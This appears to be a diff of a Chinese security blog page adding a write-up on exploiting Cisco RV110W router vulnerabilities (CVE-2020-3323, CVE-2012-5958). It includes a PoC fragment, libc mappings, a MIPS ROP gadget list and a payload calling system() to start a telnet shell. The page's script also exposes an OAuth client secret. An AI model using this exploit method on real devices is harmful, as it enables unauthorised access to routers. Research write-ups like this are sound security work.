timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[+] Exploit Success!"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>使用方法：python poc.py -ip 192.168.1.1</p>
+<p>发送 payload 之后 gdb 中看到崩溃结果</p>
+<p><img src="/img/CVE-2020-3323-4.png" alt></p>
+<p>成功控制 PC，接下来就尝试利用漏洞。</p>
+<p>关于 MIPS 架构的漏洞利用文章网络上有很多，这里就不详细介绍了，由于整个系统没有开启 aslr，libc 地址固定，所以我们的思路就是构造 ROP 直接执行 system 函数，参数中插入开启 telnetd 的命令。</p>
+<p>首先用 vmmap 命令获取设备的 libc 地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">  0x400000   0x491000 r-xp    91000 0      /usr/sbin/httpd</span><br><span class="line">  0x4d0000   0x4d8000 rw-p     8000 90000  /usr/sbin/httpd</span><br><span class="line">  0x4d8000   0x50e000 rwxp    36000 4d8000 [heap]</span><br><span class="line">0x2aaa8000 0x2aaad000 r-xp     5000 0      /lib/ld-uClibc.so.0</span><br><span class="line">0x2aaad000 0x2aaae000 rw-p     1000 2aaad000 </span><br><span class="line">0x2aaae000 0x2aabe000 r--p    10000 0      /dev/nvram</span><br><span class="line">0x2aaec000 0x2aaed000 r--p     1000 4000   /lib/ld-uClibc.so.0</span><br><span class="line">0x2aaed000 0x2aaee000 rw-p     1000 5000   /lib/ld-uClibc.so.0</span><br><span class="line">0x2aaee000 0x2aaf2000 r-xp     4000 0      /usr/lib/libnvram.so</span><br><span class="line">0x2aaf2000 0x2ab32000 ---p    40000 2aaf2000 </span><br><span class="line">0x2ab32000 0x2ab33000 rw-p     1000 4000   /usr/lib/libnvram.so</span><br><span class="line">0x2ab33000 0x2ab75000 r-xp    42000 0      /usr/lib/libshared.so</span><br><span class="line">0x2ab75000 0x2abb5000 ---p    40000 2ab75000 </span><br><span class="line">0x2abb5000 0x2abb9000 rw-p     4000 42000  /usr/lib/libshared.so</span><br><span class="line">0x2abb9000 0x2abbd000 rw-p     4000 2abb9000 </span><br><span class="line">0x2abbd000 0x2abcc000 r-xp     f000 0      /usr/lib/libcbt.so</span><br><span class="line">0x2abcc000 0x2ac0b000 ---p    3f000 2abcc000 </span><br><span class="line">0x2ac0b000 0x2ac0c000 rw-p     1000 e000   /usr/lib/libcbt.so</span><br><span class="line">0x2ac0c000 0x2ac0e000 r-xp     2000 0      /lib/libdl.so.0</span><br><span class="line">0x2ac0e000 0x2ac4d000 ---p    3f000 2ac0e000 </span><br><span class="line">0x2ac4d000 0x2ac4e000 r--p     1000 1000   /lib/libdl.so.0</span><br><span class="line">0x2ac4e000 0x2ac4f000 rw-p     1000 2000   /lib/libdl.so.0</span><br><span class="line">0x2ac4f000 0x2ae3c000 r-xp   1ed000 0      /usr/lib/libcrypto.so</span><br><span class="line">0x2ae3c000 0x2ae7c000 ---p    40000 2ae3c000 </span><br><span class="line">0x2ae7c000 0x2ae94000 rw-p    18000 1ed000 /usr/lib/libcrypto.so</span><br><span class="line">0x2ae94000 0x2ae98000 rw-p     4000 2ae94000 </span><br><span class="line">0x2ae98000 0x2af02000 r-xp    6a000 0      /usr/lib/libssl.so</span><br><span class="line">0x2af02000 0x2af42000 ---p    40000 2af02000 </span><br><span class="line">0x2af42000 0x2af48000 rw-p     6000 6a000  /usr/lib/libssl.so</span><br><span class="line">0x2af48000 0x2af58000 r-xp    10000 0      /lib/libgcc_s.so.1</span><br><span class="line">0x2af58000 0x2af97000 ---p    3f000 2af58000 </span><br><span class="line">0x2af97000 0x2af98000 rw-p     1000 f000   /lib/libgcc_s.so.1</span><br><span class="line">0x2af98000 0x2afef000 r-xp    57000 0      /lib/libc.so.0</span><br><span class="line">0x2afef000 0x2b02f000 ---p    40000 2afef000 </span><br><span class="line">0x2b02f000 0x2b030000 r--p     1000 57000  /lib/libc.so.0</span><br><span class="line">0x2b030000 0x2b031000 rw-p     1000 58000  /lib/libc.so.0</span><br><span class="line">0x2b031000 0x2b036000 rw-p     5000 2b031000 </span><br><span class="line">0x7f94b000 0x7f960000 rwxp    15000 7f94b000 [stack]</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 libc 加载到 0x2af98000 这个地址，并且每次重启都不会改变。</p>
+<p>我们的 ROP 思路是调用 system(“utelnetd -d -l /bin/sh -p 1337 &amp;”)，有了 libc 地址接下来需要寻找 system 函数的地址，目标 libc 文件位于 /lib/libc.so.0，将它加载到 IDA 可以找到 system 函数的偏移量为 0x0004C7E0。</p>
+<p>找到 system 函数地址，还需要解决参数的问题，MIPS 中函数的前几个参数由 a0、a1 等寄存器进行传递，而由于我们可控的内存只在栈上，所以肯定要想办法把栈地址加载到这些寄存器中。</p>
+<p>由于 MIPS 架构的特性，确实存在这类指令可以用于 ROP，在 mips rop finder 中使用 mipsrop.stackfinder() 就可以找到。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x0000BA84  |  addiu $a1,$sp,0x168+var_B0                          |  jalr  $s0                             |</span><br><span class="line">|  0x00011918  |  addiu $a2,$sp,0x88+var_60                           |  jalr  $s1                             |</span><br><span class="line">|  0x000250A8  |  addiu $s0,$sp,0x2A0+var_278                         |  jalr  $fp                             |</span><br><span class="line">|  0x000257A0  |  addiu $a0,$sp,0x58+var_40                           |  jalr  $s0                             |</span><br><span class="line">|  0x00025CAC  |  addiu $a0,$sp,0x60+var_48                           |  jalr  $s3                             |</span><br><span class="line">|  0x0002747C  |  addiu $a0,$sp,0x60+var_48                           |  jalr  $s3                             |</span><br><span class="line">|  0x0002CC00  |  addiu $a0,$sp,0x48+var_20                           |  jalr  $s0                             |</span><br><span class="line">|  0x0002CC08  |  addiu $a0,$sp,0x48+var_20                           |  jalr  $s1                             |</span><br><span class="line">|  0x00035DF4  |  addiu $a1,$sp,0x40+var_28                           |  jalr  $s1                             |</span><br><span class="line">|  0x0003D050  |  addiu $a0,$sp,0x38+var_20                           |  jalr  $a0                             |</span><br><span class="line">|  0x000427A8  |  addiu $s0,$sp,0xE0+var_C0                           |  jalr  $s6                             |</span><br><span class="line">|  0x00042E04  |  addiu $v1,$sp,0x118+var_F8                          |  jalr  $s1                             |</span><br><span class="line">|  0x0000D45C  |  addiu $a0,$sp,0xA0+var_88                           |  jr    0xA0+var_4($sp)                 |</span><br><span class="line">|  0x0000ED70  |  addiu $a1,$sp,0x28+var_10                           |  jr    0x28+var_8($sp)                 |</span><br><span class="line">|  0x0001D5FC  |  addiu $a3,$sp,0x30+var_10                           |  jr    0x30+var_8($sp)                 |</span><br><span class="line">|  0x00020100  |  addiu $a0,$sp,0x30+var_18                           |  jr    0x30+var_8($sp)                 |</span><br><span class="line">|  0x0002C060  |  addiu $a0,$sp,0x80+var_68                           |  jr    0x80+var_4($sp)                 |</span><br><span class="line">|  0x0002F800  |  addiu $a1,$sp,0x58+var_40                           |  jr    0x58+var_8($sp)                 |</span><br><span class="line">|  0x00030434  |  addiu $a0,$sp,0x48+var_30                           |  jr    0x48+var_8($sp)                 |</span><br><span class="line">|  0x00039948  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x000399A0  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x000399F8  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x00039A50  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x00039A90  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x00039AFC  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x00039B5C  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x0003A844  |  addiu $a0,$sp,0x50+var_38                           |  jr    0x50+var_4($sp)                 |</span><br><span class="line">|  0x0003D05C  |  addiu $a0,$sp,0x38+var_20                           |  jr    0x38+var_8($sp)                 |</span><br><span class="line">|  0x0004BAA8  |  addiu $a1,$sp,0x3048+var_1030                       |  jr    0x3048+var_4($sp)               |</span><br><span class="line">|  0x0004D314  |  addiu $a2,$sp,0x28+var_10                           |  jr    0x28+var_8($sp)                 |</span><br><span class="line">|  0x0004D484  |  addiu $a2,$sp,0x28+var_10                           |  jr    0x28+var_8($sp)                 |</span><br><span class="line">|  0x0004D8E4  |  addiu $a2,$sp,0x28+var_10                           |  jr    0x28+var_8($sp)                 |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 32 matching gadgets</span><br></pre></td></tr></table></figure>
+
+<p>具体应该用哪条就要通过调试来确定了，我们希望执行 system 函数，所以要将栈地址加载到 a0 寄存器中，通过调试发现 0x000257A0 这条指令比较合适。另外还需要注意一点，这类 gadget 的转移条件并不是像 x86 一样通过栈中的返回地址返回，而是 jr &lt;某个内存地址 or 寄存器&gt;，我们选择的这条 gadget 转移条件是 jr $s0，也就是说，需要提前控制 s0 寄存器为下一个 gadget 的地址，才能保证 ROP 链顺利执行。</p>
+<p>一般情况下 MIPS 函数返回的时候都会把栈中的部分数据转移到 s0 ~ s8 寄存器中，所以只要提前在栈中布置好 s0 对应的地址即可。</p>
+<p>到这里必要的地址都找到了，payload 的构成应该是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">padding + next_gadget_address + padding2 + gadget_address + padding3 + command</span><br></pre></td></tr></table></figure>
+
+<p>gadget_address 占据返回地址的位置，程序跑到这里先运行第一段 gadget，将栈地址加载到 a0，这个地址就指向 command，然后 jr $s0，返回到 next_gadget_address，也就是执行 system 函数，从而实现 system(command)。</p>
+<p><a href="https://asciinema.org/a/EViNYMB5pl6esKop0lktUIZ22" target="_blank" rel="noopener"><img src="https://asciinema.org/a/EViNYMB5pl6esKop0lktUIZ22.svg" alt="asciicast"></a></p>
+<h3 id="CVE-2012-5958"><a href="#CVE-2012-5958" class="headerlink" title="CVE-2012-5958"></a>CVE-2012-5958</h3><p>upnp 这个也是栈溢出漏洞，利用思路和上一个非常类似，执行 system(command) 即可，不过 upnp 服务开放在 udp 端口，在编写脚本的时候可能需要注意一下。</p>
+<p><a href="https://asciinema.org/a/Orv3mcq3JBkhVUcTh6ttyXEHv" target="_blank" rel="noopener"><img src="https://asciinema.org/a/Orv3mcq3JBkhVUcTh6ttyXEHv.svg" alt="asciicast"></a></p>
+<h3 id="后台栈溢出"><a href="#后台栈溢出" class="headerlink" title="后台栈溢出"></a>后台栈溢出</h3><p>漏洞利用思路和前面的相同，但是后台价值不高，就不演示了。</p>
+<p><strong>如有疑问，欢迎来信讨论。</strong></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>Buy me a cup of coffee~<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/z.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/w.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/11/10/cisco-rv110w-bugs/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/08/28/bypass_auth/" class="archive-article-date">
-  	<time datetime="2020-08-27T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-28</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2020/08/28/bypass_auth/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">IoT 设备中身份验证绕过的一些漏洞</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/08/28/bypass_auth/">IoT 设备中身份验证绕过的一些漏洞</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-3144"><span class="toc-number">1.</span> <span class="toc-text">CVE-2020-3144</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本信息"><span class="toc-number">1.1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-3145-amp-CVE-2020-3146-amp-CVE-xxxx-xxxx"><span class="toc-number">2.</span> <span class="toc-text">CVE-2020-3145 &amp; CVE-2020-3146 &amp; CVE-xxxx-xxxx</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本信息-1"><span class="toc-number">2.1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-1"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-3323"><span class="toc-number">3.</span> <span class="toc-text">CVE-2020-3323</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本信息-2"><span class="toc-number">3.1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-2"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2012-5958？"><span class="toc-number">4.</span> <span class="toc-text">CVE-2012-5958？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本信息-3"><span class="toc-number">4.1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-3"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用分析"><span class="toc-number">5.</span> <span class="toc-text">漏洞利用分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-3323-1"><span class="toc-number">5.1.</span> <span class="toc-text">CVE-2020-3323</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2012-5958"><span class="toc-number">5.2.</span> <span class="toc-text">CVE-2012-5958</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后台栈溢出"><span class="toc-number">5.3.</span> <span class="toc-text">后台栈溢出</span></a></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/23/IPC43AN/" class="archive-article-date">
-  	<time datetime="2020-05-22T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-23</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/23/IPC43AN/">TP-Link 摄像头漏洞</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/03/WGKF2/" class="archive-article-date">
-  	<time datetime="2020-03-02T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-03</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/03/WGKF2/">简单游戏修改器编写2</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/29/CVE-2019-7406/" class="archive-article-date">
-  	<time datetime="2020-02-28T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-29</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/29/CVE-2019-7406/">CVE-2019-7406 复现</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/25/ODBUG/" class="archive-article-date">
-  	<time datetime="2020-02-24T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-25</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/25/ODBUG/">OllyDBG ollydbg.ini 缓冲区溢出漏洞复现</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/23/WGKF/" class="archive-article-date">
-  	<time datetime="2020-02-22T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-23</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/23/WGKF/">简单的游戏修改器编写</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/21/whydebuggercandebug/" class="archive-article-date">
-  	<time datetime="2020-02-20T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/21/whydebuggercandebug/">为什么调试器能调试？</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/10/firmadyne2/" class="archive-article-date">
-  	<time datetime="2020-01-09T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/10/firmadyne2/">我的固件模拟之路(二)</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/08/iot_brief/" class="archive-article-date">
-  	<time datetime="2020-01-07T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-08</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/08/iot_brief/">firmadyne 简单使用指南 &amp; 模拟示例</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/7/">7</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
-    </nav>
+  <div id="gitment-ctn"></div> 
+<link rel="stylesheet" href="https://billts.site/extra_css/gitment.css">
+<script src="https://billts.site/js/gitment.js"></script>
+<script>
+var gitment = new Gitment({
+  id: "http://yoursite.com/2020/11/10/cisco-rv110w-bugs/",
+  owner: 'rrrrrrri',
+  repo: 'rrrrrrri.github.io',
+  oauth: {
+    client_id: 'b02ae2fd83142bce4350',
+    client_secret: 'dad31d4a347d05c4f146be764e2848dc72cbd576',
+  },
+})
+gitment.render('gitment-ctn')
+</script>
   
 
 
@@ -462,8 +492,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
